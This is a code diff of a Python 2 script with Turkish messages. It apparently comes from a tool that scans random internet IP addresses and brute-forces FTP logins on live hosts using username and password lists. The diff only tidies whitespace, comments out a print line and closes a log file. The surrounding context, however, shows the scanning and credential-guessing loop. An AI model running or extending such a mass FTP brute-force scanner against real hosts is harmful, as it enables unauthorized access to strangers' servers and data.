@@ -11,7 +11,7 @@ with open("not_found.txt") as f:
    for satir in f:
       final = str(satir.replace("\n",""))
       not_oku.append(final)
-      
+
 def GenerateIP():
    while True:
       ip0 = randrange(0,256)
@@ -54,7 +54,7 @@ with open("pass.txt") as f:
    for satir in f:
       final = str(satir.replace("\n",""))
       pass_oku.append(final)
-		
+
 print "[INF] Tarama Baslatiliyor.."
 print ""
 
@@ -63,7 +63,7 @@ while True:
       s=socket.socket()
       if time != "":
          s.settimeout(times)
-         
+
       target = GenerateIP()
       s.connect((target, 80))
       print "[+] Aktif --> "+target
@@ -93,23 +93,22 @@ while True:
                durum = 1
                baglanti.quit()
                print " [BF] Olmadi -> username: %s password: %s" %(my_user, my_pass)
-               
+
          if durum == 2:
             print ""
             print "[INF] Taramaya Devam Ediliyor.."
             print ""
             break
-         
+
       if durum == 1:
          print ""
          print "[INF] %s FTP BruteForce basarisiz oldu" %(target)
          print "[INF] Taramaya Devam Ediliyor.."
          print ""
-         
+
    except:
-      print "[-] Aktif Degil --> "+target
+      #print "[-] Aktif Degil --> "+target
       fa = open("not_found.txt", 'a')
       starget = target + "\n"
       fa.write(starget)
-      pass
-
+      fa.close()
